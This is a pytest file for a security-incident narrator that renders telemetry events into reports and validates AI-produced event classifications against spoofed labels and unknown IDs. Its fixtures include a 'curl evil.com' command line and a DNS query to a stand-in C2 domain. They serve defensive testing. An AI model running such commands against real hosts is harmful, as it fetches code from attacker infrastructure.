import os

import pytest

from narrator.structural import (
    ObservationKind,
    narrate_structural,
    render_event_line,
    render_structural_report,
    validate_classifications,
)
from telemetry.schema import Event, EventType, Incident
from telemetry.synth_events import download_exec_incident


def _event(**overrides) -> Event:
    base = dict(id="e1", ts="2026-01-01T00:00:00Z", type=EventType.PROCESS_START, host_id="h1", proc_guid="g1")
    base.update(overrides)
    return Event(**base)


def test_render_event_line_uses_the_template_for_its_event_type():
    e = _event(type=EventType.DNS_QUERY, dns_name="c2.example-bad.net")
    line = render_event_line(e, ObservationKind.MALICIOUS_ACTIVITY)
    assert "[malicious_activity]" in line
    assert "c2.example-bad.net" in line


def test_render_event_line_includes_cmdline_when_present():
    e = _event(proc_image="/bin/bash", proc_cmdline="curl evil.com")
    line = render_event_line(e, ObservationKind.SUSPICIOUS_ACTIVITY)
    assert "/bin/bash" in line
    assert 'cmdline: "curl evil.com"' in line


# --- validate_classifications: this is the security-critical function - a
# malformed or attacker-influenced classification must never be trusted. ---


def _incident_with_ids(*ids: str) -> Incident:
    return Incident(id="inc1", host_id="h1", risk_score=90, technique_set=["T1105"], events=[_event(id=i) for i in ids])


def test_validate_classifications_accepts_a_valid_entry():
    incident = _incident_with_ids("e1")
    result = validate_classifications(incident, [{"event_id": "e1", "kind": "malicious_activity"}])
    assert result == {"e1": ObservationKind.MALICIOUS_ACTIVITY}


def test_validate_classifications_drops_an_unknown_event_id():
    incident = _incident_with_ids("e1")
    result = validate_classifications(incident, [{"event_id": "e999-not-real", "kind": "malicious_activity"}])
    assert result == {}


def test_validate_classifications_drops_an_invented_kind_not_in_the_allow_list():
    incident = _incident_with_ids("e1")
    result = validate_classifications(incident, [{"event_id": "e1", "kind": "definitely_benign_trust_me"}])
    assert result == {}


def test_validate_classifications_ignores_malformed_entries_missing_keys():
    incident = _incident_with_ids("e1")
    result = validate_classifications(incident, [{"event_id": "e1"}, {"kind": "malicious_activity"}, {}])
    assert result == {}


def test_render_structural_report_includes_every_event_even_if_unclassified():
    # An event the model never classified (or whose classification was
    # dropped by validation) must still appear in the final report - it
    # can't be silently omitted the way it could in the naive/hardened tiers.
    incident = _incident_with_ids("e1", "e2")
    report = render_structural_report(incident, classifications={})
    assert "[unclassified]" in report
    assert report.count("- [") == 2


def test_render_structural_report_header_uses_trusted_risk_score_verbatim():
    incident = Incident(id="inc1", host_id="h1", risk_score=97, technique_set=["T1105", "T1071"], events=[_event()])
    report = render_structural_report(incident, classifications={})
    assert "Risk score: 97/100" in report
    assert "T1105, T1071" in report


@pytest.mark.skipif(
    not os.environ.get("ANTHROPIC_API_KEY"),
    reason="requires ANTHROPIC_API_KEY for a live Claude API call",
)
def test_narrate_structural_produces_a_report_for_every_event():
    incident = download_exec_incident()
    report = narrate_structural(incident)
    assert report.count("- [") == len(incident.events)
